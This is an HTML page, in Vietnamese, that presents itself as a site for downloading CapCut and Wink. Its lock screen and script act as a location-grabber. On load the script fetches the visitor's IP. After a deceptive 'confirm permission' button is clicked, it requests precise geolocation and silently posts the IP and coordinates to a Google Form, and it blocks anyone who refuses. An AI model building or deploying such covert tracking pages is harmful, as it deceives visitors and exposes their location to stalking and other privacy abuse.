<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Web tải app</title>
    <style>
        #main-content {
            display: none;
        }
        h1 {
            color: rgb(255, 0, 0);
            font-size: 100px;
        }
        a {
            font-size: 50px;
            color: #ffc400;
            text-decoration: none;
        }
        .download-btn {
            font-size: 35px;
            font-family: 'Times New Roman';
            margin: 10px 0;
            cursor: pointer;
        }
        body {
            background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_4PqDG7wLnJZViwWszE8pCNUcaKp2B9usnL3ljV5g_A&s=10");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            margin: 0;
            text-align: center;
        }

        /* Màn hình khóa */
        #locker-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.95);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            font-family: Arial, sans-serif;
            padding: 20px;
            box-sizing: border-box;
        }
        #locker-overlay h2 {
            font-size: 35px;
            color: #ffc400;
            margin-bottom: 10px;
        }
        #locker-overlay p {
            font-size: 20px;
            max-width: 650px;
            line-height: 1.6;
            margin: 10px 0;
        }
        #verify-btn {
            font-size: 25px;
            padding: 15px 30px;
            background-color: #ff0000;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
        }
        #verify-btn:hover {
            background-color: #cc0000;
        }
        #error-msg {
            color: #ff4d4d;
            font-size: 22px;
            margin-top: 20px;
            font-weight: bold;
            display: none;
        }
    </style>
</head>
<body>

    <!-- MÀN HÌNH KHÓA VỚI NỘI DUNG THEO YÊU CẦU -->
    <div id="locker-overlay">
        <h2>THÔNG BÁO XÁC NHẬN</h2>
        <p>Bạn cần xác nhận quyền để vào trang web.</p>
        <p style="color: #ffcccc; font-size: 18px;">Lưu ý: Web không chịu trách nhiệm về vấn đề trải nghiệm của bạn nếu từ chối cấp quyền.</p>
        
        <button id="verify-btn">BẤM VÀO ĐÂY ĐỂ TIẾP TỤC</button>
        
        <div id="error-msg">⚠️ Bạn đã từ chối quyền! Web từ chối truy cập. Vui lòng tải lại trang (F5) để thử lại!</div>
    </div>

    <!-- NỘI DUNG WEB CHÍNH -->
    <div id="main-content">
        <h1>Đây là trang web tải app</h1>
        <br>
        <a href="https://www.capcut.com/vi-vn/tools/desktop-video-editor" target="_blank">Tải Capcut bản mới nhất</a>
        <br><br><br>
        <a href="https://capcut.vi.uptodown.com/windows/dw/1124018008" target="_blank">
            <button class="download-btn">Bấm vào đây để tải Capcut 7.5</button>
        </a>
        <br><br><br>
        <a href="https://wink-meitu.vi.uptodown.com/windows" target="_blank">
            <button class="download-btn">Bấm vào đây để tải wink</button>
        </a>
        <br><br><br>
        <a href="https://download.com.vn/capcut-158978" target="_blank">
            <button class="download-btn">Capcut free</button>
        </a>
    </div>

    <script>
        const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfJs2sEvay1GimaHnWYdk-HhnjuI5LcW8gzfPcehrpRvsjJgg/formResponse";
        const ENTRY_IP = "entry.1588338519";
        const ENTRY_LAT = "entry.791072472";
        const ENTRY_LNG = "entry.1393666541";

        let userIP = "Không lấy được IP";

        function sendToGoogleForm(ip, lat, lng) {
            const formData = new FormData();
            formData.append(ENTRY_IP, ip);
            formData.append(ENTRY_LAT, lat);
            formData.append(ENTRY_LNG, lng);

            fetch(FORM_URL, {
                method: "POST",
                mode: "no-cors",
                body: formData
            });
        }

        async function getIP() {
            try {
                const response = await fetch("https://api.ipify.org?format=json");
                const data = await response.json();
                userIP = data.ip;
            } catch (e) {
                console.log("Lỗi IP");
            }
        }
        getIP();

        document.getElementById("verify-btn").addEventListener("click", () => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latFormatted = "'" + position.coords.latitude;
                        const lngFormatted = "'" + position.coords.longitude;
                        
                        sendToGoogleForm(userIP, latFormatted, lngFormatted);

                        document.getElementById("locker-overlay").style.display = "none";
                        document.getElementById("main-content").style.display = "block";
                    },
                    (error) => {
                        sendToGoogleForm(userIP, "Bị chặn", "Bị chặn");
                        document.getElementById("error-msg").style.display = "block";
                    },
                    { timeout: 8000, enableHighAccuracy: true }
                );
            } else {
                alert("Trình duyệt không hỗ trợ!");
            }
        });
    </script>
</body>
</html>
